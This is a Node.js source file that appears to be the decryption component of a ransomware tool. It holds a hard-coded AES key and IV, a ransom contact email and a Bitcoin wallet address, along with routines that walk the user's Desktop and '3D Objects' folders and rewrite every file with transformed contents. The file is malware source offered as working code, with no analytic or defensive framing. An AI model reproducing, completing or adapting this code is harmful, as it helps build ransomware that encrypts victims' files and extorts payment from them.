const crypto = require('crypto');
var fs = require('fs');
var recursive = require("recursive-readdir");
const { exec } = require("child_process");

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

const ENC= 'dsazdazd41456d1za516d15za15daz15';
const IV = "54d45az456d15ad1";



const ALGO = "aes-256-cbc"
const email = "loladubernet@yandex.com"
const btcAdress = "bc1qcm34ax9ypck2h4f9smhn67s7xvkaefq5w7c8ls"
const imageURL = "https://i.imgur.com/p7twZ9B.png"



var fs = require('fs'),
    request = require('request');

var download = function(uri, filename, callback){
  request.head(uri, function(err, res, body){
    console.log('content-type:', res.headers['content-type']);
    console.log('content-length:', res.headers['content-length']);

    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
  });
};


function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const encrypt = ((text) => 
{
   let cipher = crypto.createCipheriv(ALGO, ENC, IV);
   let encrypted = cipher.update(text, 'utf8', 'base64');
   encrypted += cipher.final('base64');
   return encrypted;
});

const decrypt = ((text) => 
{
   let decipher = crypto.createDecipheriv(ALGO, ENC, IV);
   let decrypted = decipher.update(text, 'base64', 'utf8');
   return (decrypted + decipher.final('utf8'));
});

/*
const encrypted_key = encrypt("test");
const decrypted_key = decrypt("8Xjjcjk7JN/eawL/3tJSPA==");
*/


var counter = 0;





recursive(`C:/Users/${require("os").userInfo().username}/Desktop/`, function (err, files) {
  // `files` is an array of file paths
  try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
          continue
        }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = decrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }
  }catch{
    return
  }

});

recursive(`C:/Users/${require("os").userInfo().username}/3D Objects/`, function (err, files) {
  // `files` is an array of file paths
  try{
  for(i = 0; i<=files.length; i++){
    try{
              if(files[i].includes(".ini")){
          continue
        }
      var contents = fs.readFileSync(files[i], 'utf8');
      var encrypted_key = decrypt(contents)
      console.log(encrypted_key)
      fs.truncate(files[i], 0, function(){console.log('done')})
      fs.writeFile(files[i], encrypted_key, function (err) {
        if (err) return console.log(err);
        console.log(files[i]);
      });

    }catch{
      continue
    }

  }}catch{
  return
}
});
